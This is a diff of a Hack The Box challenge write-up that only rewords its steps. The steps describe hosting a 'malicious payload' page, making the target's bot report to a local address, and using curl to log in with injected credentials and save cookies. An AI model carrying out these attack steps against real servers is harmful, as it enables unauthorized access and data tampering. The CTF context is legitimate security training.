@@ -48,13 +48,13 @@ Inject the malicious data into the application (ID-kittykat PW-kittykat).
 
 Log in and access the protected endpoint.
 
-# **Tasks:**
+# **Tasks performed to perform this challange:**
 
-Create the malicious payload(index.html) to fetch data from /get_tornados.
+Develop the harmful payload (index.html) to retrieve information from /get_tornados.
 
-Update the machine details in /update_tornado with the injected credentials.
+Revise the machine information in /update_tornado using the provided credentials.
 
-Host this payload as index.html on a local server or on NGROK Public server if you have the subscription.
+Serve this payload as index.html on a local server or via NGROK Public server if you have the subscription.
 
 # **Hosting the exploit and exploiting the vulnerability:**
 
@@ -62,15 +62,15 @@ Get the status of the Ip Machine to know about it
 
 curl -X GET "http://94.237.63.109:45919/stats"
 
-Run the following command to host index.html file http server.
+Run the following command to host the index.html file http server.
 
 python -m http.server 1337
 
-Reporting a Tornado on the Box server.
+Reporting the tornado on the hack the box server.
 
 curl "http://94.237.59.207:47563/report_tornado?ip=127.0.0.1"
 
-Inject the new User to the server for getting access and store cookie data
+Add the new User to the server to gain access and save cookie information.
 
 curl -X POST "http://94.237.59.207:47563/login" \            -H "Content-Type: application/json" \ -d '{"username": "kittykat", "password": "kittykat"}' \ -c cookie.txt 
 
